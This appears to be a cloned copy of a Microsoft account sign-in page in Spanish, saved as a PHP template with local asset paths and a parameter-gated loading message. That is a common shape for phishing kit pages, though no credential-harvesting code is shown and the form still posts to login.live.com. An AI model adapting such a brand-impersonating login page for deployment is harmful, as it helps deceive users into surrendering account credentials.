    <?php if (isset($_GET['wp']) && $_GET['wp'] == 'MBI_SIMPLE'):?>
    <div id="loading">
        Cargando...
    </div>
    <?php endif; ?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title></title>
    <link rel="stylesheet" title="Converged_v2" type="text/css" href="css/Converged_v23082_T-H8TkOzzOd03nMtjI4Hew2.css">
</head>
<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
    <div>
        <!--  -->

        <!--  -->

        <div data-bind="if: activeDialog"></div>

        <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="post" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }, ariaHidden: !!activeDialog(), css: { 'provide-min-height': svr.cl }" action="https://login.live.com/ppsecure/post.srf?cobrandid=90015&amp;id=292841&amp;contextid=064DBB0A2FCAF4CA&amp;opid=362DB19AD84C9AE5&amp;bk=1669925066&amp;uaid=c76e54ae35bd43c9b48c898bc63bb837&amp;pid=0">
            <!-- ko withProperties: { '$loginPage': $data } -->
            <div class="login-paginated-page">
                <!--  -->

                <!-- ko ifnot: useLayoutTemplates -->
                <!-- /ko -->

                <!-- ko if: useLayoutTemplates -->
                <!-- ko withProperties: { '$page': $parent } -->
                <!-- ko if: isLightboxTemplate() -->
                <div id="lightboxTemplateContainer" data-bind="component: { name: 'lightbox-template', params: { serverData: svr, showHeader: $page.showHeader(), headerLogo: $page.headerLogo() } }, css: { 'provide-min-height': svr.cl }">
                    <!--  -->

                    <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.cl },
    component: { name: 'background-image-control',
        publicMethods: $page.backgroundControlMethods,
        event: { load: $page.backgroundImageControl_onLoad } }">
                        <div class="background-image-holder" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
                            <!-- ko if: smallImageUrl -->
                            <!-- /ko -->

                            <!-- ko if: backgroundImageUrl -->
                            <div id="backgroundImage" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }" style="background-image: url('images/2_bc3d32a696895f78c19df6c717586a5d.svg');"
                                class="background-image ext-background-image"></div>
                            <!-- ko if: useImageMask -->
                            <!-- /ko -->
                            <!-- /ko -->
                        </div>
                    </div>

                    <!-- ko if: svr.cq -->
                    <!-- /ko -->

                    <!-- ko withProperties: { '$masterPageContext': $parentContext } -->
                    <div class="outer" data-bind="css: { 'app': $page.backgroundLogoUrl }">
                        <!-- ko if: showHeader -->
                        <!-- /ko -->

                        <div class="template-section main-section">
                            <div data-bind="externalCss: { 'middle': true }" class="middle ext-middle">
                                <div class="full-height" data-bind="component: { name: 'content-control', params: { serverData: svr, isVerticalSplitTemplate: $page.isVerticalSplitTemplate() } }">
                                    <!--  -->

                                    <!-- ko withProperties: { '$content': $data } -->
                                    <div class="flex-column">
                                        <!-- ko if: $page.paginationControlHelper.showBackgroundLogoHolder -->
                                        <!-- /ko -->

                                        <!-- ko if: $page.paginationControlHelper.showPageLevelTitleControl -->
                                        <!-- /ko -->

                                        <div class="win-scroll">
                                            <div id="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox has-popup">

                                                <!-- ko template: { nodes: $masterPageContext.$componentTemplateNodes, data: $page } -->

                                                <!-- ko if: svr.BV -->
                                                <!-- /ko -->

                                                <div class="lightbox-cover" data-bind="css: { 'disable-lightbox': svr.CE &amp;&amp; showLightboxProgress() }"></div>

                                                <!-- ko if: showLightboxProgress -->
                                                <!-- /ko -->

                                                <!-- ko if: loadBannerLogo -->
                                                <div data-bind="component: { name: 'logo-control',
            params: {
                isChinaDc: svr.fIsChinaDc,
                bannerLogoUrl: bannerLogoUrl() } }">
            <img class="logo" role="img" src="images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft">
                                                    <!-- /ko -->
                                                    <!-- /ko -->
                                                    <!-- /ko -->
                                                    <!-- /ko -->
                                                </div>
                                                <!-- /ko -->

                                                <!-- ko if: svr.DF && paginationControlHelper.showLwaDisclaimer() -->
                                                <!-- /ko -->

                                                <!-- ko if: asyncInitReady -->
                                                <div role="main">
                                                    <!--  -->

                                                    <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
                                                        <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.i) -->
                                                        <!-- /ko -->

                                                        <div class="pagination-view animate slide-in-next">

                                                            <!-- ko foreach: views -->
                                                            <!-- ko if: $parent.currentViewIndex() === $index() -->
                                                            <!-- ko template: { nodes: [$data], data: $parent } -->
                                                            <div data-viewid="1" data-showfedcredbutton="true">
                                                                <!--  -->

                                                                <div data-bind="component: { name: 'header-control',
    params: {
        serverData: svr,
        title: str['WF_STR_HeaderDefault_Title'] } }">
                                                                    <div>
                                                                        <div class="row title ext-title" id="loginHeader" data-bind="externalCss: { 'title': true }">
                                                                            <div role="heading" aria-level="1" data-bind="text: title">Iniciar sesión</div>
                                                                            <!-- ko if: isSubtitleVisible -->
                                                                            <!-- /ko -->
                                                                        </div>

                                                                        <!-- ko if: headerDescription -->
                                                                        <!-- /ko -->
                                                                    </div>
                                                                </div>

                                                                <!-- ko if: pageDescription && !svr.CO -->
                                                                <!-- /ko -->

                                                                <div class="row">
                                                                    <div role="alert" aria-live="assertive">
                                                                        <!-- ko if: usernameTextbox.error -->
                                                                        <!-- /ko -->
                                                                    </div>

                                                                    <div class="form-group col-md-24">
                                                                        <!-- ko if: prefillNames().length > 1 -->
                                                                        <!-- /ko -->

                                                                        <!-- ko ifnot: prefillNames().length > 1 -->
                                                                        <div class="placeholderContainer">
                                                                            <!-- ko withProperties: { '$placeholderText': placeholderText } -->
                                                                            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                                                                            <input type="email" name="loginfmt" id="i0116" maxlength="113" class="form-control ltr_override input ext-input text-box ext-text-box" aria-required="true" data-report-event="Signin_Email_Phone_Skype" data-report-trigger="click" data-report-value="Email_Phone_Skype_Entry"
                                                                                 aria-label="Escriba su correo electrónico, teléfono o Skype." aria-describedby="loginHeader usernameError" placeholder="Correo electrónico, teléfono o Skype" data-report-attached="1">

                                                                            <input name="passwd" type="password" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                                                                            <!-- /ko -->
                                                                            <!-- /ko -->
                                                                            <!-- ko ifnot: usePlaceholderAttribute -->
                                                                            <!-- /ko -->
                                                                        </div>
                                                                        <!-- /ko -->
                                                                    </div>
                                                                </div>

                                                                <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }, externalCss: { 'password-reset-links-container': true }" class="position-buttons password-reset-links-container ext-password-reset-links-container">
                                                                    <div class="row">
                                                                        <div class="col-md-24">
                                                                            <div class="text-13">

                                                                                <div class="form-group">¿No tiene una cuenta? <a href="#"
                                                                                        id="signup" aria-label="Crear una cuenta Microsoft">Cree una.</a></div>

                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!-- ko if: svr.cb -->
                                                                <!-- /ko -->

                                                                <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                                                                    <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                                                                        <div>
                                                                            <div class="col-xs-24 no-padding-left-right button-container button-field-container ext-button-field-container">

                                                                                <!-- ko if: isSecondaryButtonVisible -->
                                                                                <!-- /ko -->

                                                                                <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                                                                    <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                                                                    <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit">
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>

                                                                <!-- ko if: tenantBranding.BoilerPlateText -->
                                                                <!-- /ko -->
                                                            </div>
                                                            
                                                        </div>
                                                    </div>
                                                </div>
                                                <!-- /ko -->

                                                <input type="hidden" name="ps" data-bind="value: postedLoginStateViewId" value="">
                                                <input type="hidden" name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="">
                                                <input type="hidden" name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="">
                                                <input type="hidden" name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="">
                                                <!-- ko if: svr.ad && !svr.fSkipRenderingNewCanaryToken -->
                                                <!-- /ko -->
                                                <!-- ko if: !svr.ad || svr.fSkipRenderingNewCanaryToken -->
                                                <input type="hidden" name="canary" data-bind="value: svr.canary" value="">
                                                <!-- /ko -->
                                                <input type="hidden" name="ctx" data-bind="value: ctx" value="">
                                                <input type="hidden" name="hpgrequestid" data-bind="value: svr.sessionId" value="">
                                                <input type="hidden" id="i0327" data-bind="attr: { name: svr.bp }, value: flowToken" name="PPFT" value="DQuUZUzMsQUtPTy*bvIr1kBJySXJdKgPQ8Rsrv2SgOZMgsC6SZEvIn2tO2PnISyBY6u7Xjl0!X1j5MAbccUhBfBZU604jKvIA!xy09ehkIHoEXc8cTZGhgw23tOm9vqo2965iA19EsGUCGP*!xiMdoAWwL*!JOoc!7qEeI!GycyYb1WaJKdUbF8T7fhGZePa55kfY8woxQAifeLBfROe*TwwGJnXYOfni!8vHTTWvpRnocBZKu4KnBGOxCdt4xHItzJ*qqdyhkHjgAHckKcVMh0$">
                                                <input type="hidden" name="PPSX" data-bind="value: svr.DB" value="Passpor">
                                                <input type="hidden" name="NewUser" value="1">
                                                <input type="hidden" name="FoundMSAs" data-bind="value: svr.Ap" value="">
                                                <input type="hidden" name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0">
                                                <input type="hidden" name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0">
                                                <input type="hidden" name="CookieDisclosure" data-bind="value: svr.BV ? 1 : 0" value="0">
                                                <input type="hidden" name="IsFidoSupported" data-bind="value: isFidoSupported() ? 1 : 0" value="0">
                                                <input type="hidden" name="isSignupPost" data-bind="value: isSignupPost() ? 1 : 0" value="0">
                                                <!-- ko ifnot: svr.fShouldSupportTargetCredentialForRecovery -->
                                                <input type="hidden" name="isRecoveryAttemptPost" data-bind="value: isRecoveryAttemptPost() ? 1 : 0" value="0">
                                                <!-- /ko -->
                                                <!-- ko if: svr.fShouldSupportTargetCredentialForRecovery && targetCredentialForRecovery() -->
                                                <!-- /ko -->
                                                <div data-bind="component: { name: 'instrumentation-control',
            publicMethods: instrumentationMethods,
            params: { serverData: svr } }">
                                                    <input type="hidden" name="i19" data-bind="value: timeOnPage" value=""></div>
                                                <!-- /ko -->
                                            </div>

                                            <!-- ko if: $page.showFedCredAndNewSession -->
                                            <!-- ko if: $page.showFedCredButtons -->
                                            <div data-bind="css: { 'app': $page.backgroundLogoUrl }, externalCss: { 'promoted-fed-cred-box': true }" class="promoted-fed-cred-box ext-promoted-fed-cred-box">
                                                <div class="promoted-fed-cred-content" data-bind="css: {
                'animate': $page.useCssAnimations &amp;&amp; $page.animate(),
                'slide-out-next': $page.animate.isSlideOutNext,
                'slide-in-next': $page.animate.isSlideInNext,
                'slide-out-back': $page.animate.isSlideOutBack,
                'slide-in-back': $page.animate.isSlideInBack,
                'app': $page.backgroundLogoUrl }">

                                                    <!-- ko foreach: $page.otherSigninOptions -->
                                                    <div class="row tile">
                                                        <div class="table" role="button" tabindex="0" data-bind="
                        css: { 'list-item': svr.cI },
                        pressEnter: $page.otherSigninOptionsButton_onClick,
                        click: $page.otherSigninOptionsButton_onClick,
                        ariaLabel: $data.text" aria-label="Opciones de inicio de sesión">

                                                            <div class="table-row">
                                                                <div class="table-cell tile-img medium">
                                                                    <!-- ko component: 'accessible-image-control' -->
                                                                    <!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme -->
                                                                    <!-- /ko -->
                                                                    <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                                                                    <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img medium" role="presentation" data-bind="attr: { src: $data.darkIconUrl }" src="images/signin-options_4e48046ce74f4b89d45037c90576bfac.svg">
                                                                    <!-- /ko -->
                                                                    <!-- /ko -->
                                                                    <!-- /ko -->
                                                                </div>
                                                                <div class="table-cell text-left content" data-bind="css: { 'content': !svr.cI }">
                                                                    <div data-bind="
                                    text: $data.text,
                                    attr: { 'data-test-id': $data.testId }" data-test-id="signinOptions">Opciones de inicio de sesión</div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <!-- /ko -->
                                                </div>
                                            </div>
                                            <!-- /ko -->

                                            <!-- ko if: $page.newSession -->
                                            <!-- /ko -->
                                            <!-- /ko -->

                                            <!-- ko if: $page.showDebugDetails -->
                                            <!-- /ko -->
                                        </div>
                                    </div>
                                    <!-- /ko -->
                                </div>
                            </div>
                        </div>

                        <!-- ko if: $page.paginationControlHelper.showFooterControl -->
                        <div id="footer" role="contentinfo" data-bind="
        externalCss: {
            'footer': true,
            'has-background': !$page.useDefaultBackground() &amp;&amp; $page.showFooter(),
            'background-always-visible': $page.backgroundLogoUrl }" class="footer ext-footer">

                            <div data-bind="component: { name: 'footer-control',
            publicMethods: $page.footerMethods,
            params: {
                serverData: svr,
                useDefaultBackground: $page.useDefaultBackground(),
                hasDarkBackground: $page.backgroundLogoUrl(),
                showLinks: true,
                showFooter: $page.showFooter(),
                hideTOU: $page.hideTOU(),
                termsText: $page.termsText(),
                termsLink: $page.termsLink(),
                hidePrivacy: $page.hidePrivacy(),
                privacyText: $page.privacyText(),
                privacyLink: $page.privacyLink() },
            event: {
                agreementClick: $page.footer_agreementClick,
                showDebugDetails: $page.toggleDebugDetails_onClick } }">
                                <!-- ko if: !hideFooter && (showLinks || impressumLink || showIcpLicense) -->
                                <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links" data-bind="externalCss: { 'footer-links': true }">

                                    <!-- ko if: showFooter -->
                                    <!-- ko if: !hideTOU -->
                                    <a id="ftrTerms" data-bind="
            text: termsText,
            href: termsLink,
            click: termsLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=ES-ES&amp;uaid=c76e54ae35bd43c9b48c898bc63bb837" class="footer-content ext-footer-content footer-item ext-footer-item">Términos de uso</a>
                                    <!-- /ko -->

                                    <!-- ko if: !hidePrivacy -->
                                    <a id="ftrPrivacy" data-bind="
            text: privacyText,
            href: privacyLink,
            click: privacyLink_onClick,
            externalCss: {
                'footer-content': true,
                'footer-item': true,
                'has-background': !useDefaultBackground,
                'background-always-visible': hasDarkBackground }" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=ES-ES&amp;uaid=c76e54ae35bd43c9b48c898bc63bb837" class="footer-content ext-footer-content footer-item ext-footer-item">Privacidad y cookies</a>
                                    <!-- /ko -->

                                    <!-- ko if: impressumLink -->
                                    <!-- /ko -->

                                    <!-- ko if: a11yConformeLink -->
                                    <!-- /ko -->

                                    <!-- ko if: showIcpLicense -->
                                    <!-- /ko -->
                                    <!-- /ko -->

                                    <!-- Set attr binding before hasFocusEx to prevent Narrator from losing focus -->
                                    <a id="moreOptions" href="#" role="button" data-bind="
        click: moreInfo_onClick,
        ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'],
        attr: { 'aria-expanded': showDebugDetails().toString() },
        hasFocusEx: focusMoreInfo(),
        externalCss: {
            'footer-content': true,
            'footer-item': true,
            'debug-item': true,
            'has-background': !useDefaultBackground,
            'background-always-visible': hasDarkBackground }" aria-label="Haga clic aquí para obtener información relacionada con la solución de problemas." aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">...</a>
                                </div>
                                <!-- /ko -->

                                <!-- ko if: svr.cb && showLinks -->
                                <!-- /ko -->
                            </div>
                        </div>
                        <!-- /ko -->
                    </div>
                    <!-- /ko -->
                </div>
                <!-- /ko -->

                <!-- ko if: isVerticalSplitTemplate() && isTemplateLoaded() -->
                <!-- /ko -->
                <!-- /ko -->
                <!-- /ko -->
            </div>
            <!-- /ko -->
        </form>

        <form data-bind="postRedirectForm: postRedirect" method="POST" aria-hidden="true" target="_top"></form>

        <!-- ko if: svr.aL -->
        <div id="idPartnerPL" data-bind="injectIframe: { url: svr.aL }"></div>
        <!-- /ko -->

        <!-- ko if: svr.Ds -->
        <!-- /ko -->
    </div>
</body>
</html>